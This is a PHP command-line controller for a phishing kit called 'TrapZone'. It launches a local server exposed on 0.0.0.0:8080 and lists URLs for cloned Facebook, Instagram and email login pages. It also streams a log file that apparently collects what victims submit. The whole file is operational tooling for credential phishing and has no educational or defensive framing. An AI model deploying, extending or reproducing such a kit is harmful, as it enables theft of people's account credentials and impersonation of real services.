#!/usr/bin/env php
<?php
// TrapZone CLI Controller
require __DIR__ . '/includes/config.php';
require __DIR__ . '/includes/functions.php';

function ascii_art() {
    $art = "
\033[1;31m░██████████                               ░█████████                                  
    ░██                                         ░██                                   
    ░██    ░██░████  ░██████   ░████████       ░██    ░███████  ░████████   ░███████  
    ░██    ░███           ░██  ░██    ░██    ░███    ░██    ░██ ░██    ░██ ░██    ░██ 
    ░██    ░██       ░███████  ░██    ░██   ░██      ░██    ░██ ░██    ░██ ░█████████ 
    ░██    ░██      ░██   ░██  ░███   ░██  ░██       ░██    ░██ ░██    ░██ ░██        
    ░██    ░██       ░█████░██ ░██░█████  ░█████████  ░███████  ░██    ░██  ░███████  
                               ░██                                                    
                               ░██                                                    
                                                                                      \033[0m
";
    echo $art . PHP_EOL;
}

function menu() {
    echo "\033[1;33m[1]\033[0m Start Local Server\n";
    echo "\033[1;33m[2]\033[0m Show Phishing URLs\n";
    echo "\033[1;33m[3]\033[0m Monitor Logs\n";
    echo "\033[1;33m[0]\033[0m Exit\n";
    echo "Choose option: ";
}

ascii_art();

while (true) {
    menu();
    $choice = trim(fgets(STDIN));

    switch ($choice) {
        case '1':
            echo "\033[1;32m[+] Starting server at http://localhost:8080 ...\033[0m\n";
            $cmd = "php -S 0.0.0.0:8080 -t " . __DIR__ . " > /dev/null 2>&1 & echo $!";
            $pid = shell_exec($cmd);
            file_put_contents("server.pid", $pid);
            echo "Server running with PID: $pid\n";
            break;

        case '2':
            echo "Copy & open these URLs in browser:\n";
            echo "  \033[1;31mhttp://localhost:8080/phishing_sites/facebook/\033[0m\n";
            echo "  \033[1;33mhttp://localhost:8080/phishing_sites/instagram/\033[0m\n";
            echo "  \033[1;31mhttp://localhost:8080/phishing_sites/email/\033[0m\n";
            break;

        case '3':
            echo "Monitoring logs (Ctrl+C to stop):\n\n";
            $lastSize = 0;
            while (true) {
                clearstatcache();
                $size = filesize(LOG_FILE);
                if ($size > $lastSize) {
                    $fh = fopen(LOG_FILE, 'r');
                    fseek($fh, $lastSize);
                    while ($line = fgets($fh)) {
                        echo "\033[1;31m[LOG]\033[0m $line";
                    }
                    fclose($fh);
                    $lastSize = $size;
                }
                usleep(500000); // 0.5s
            }
            break;

        case '0':
            echo "Exiting...\n";
            if (file_exists("server.pid")) {
                $pid = trim(file_get_contents("server.pid"));
                shell_exec("kill $pid");
                unlink("server.pid");
                echo "Server stopped.\n";
            }
            exit;

        default:
            echo "Invalid choice!\n";
    }
}
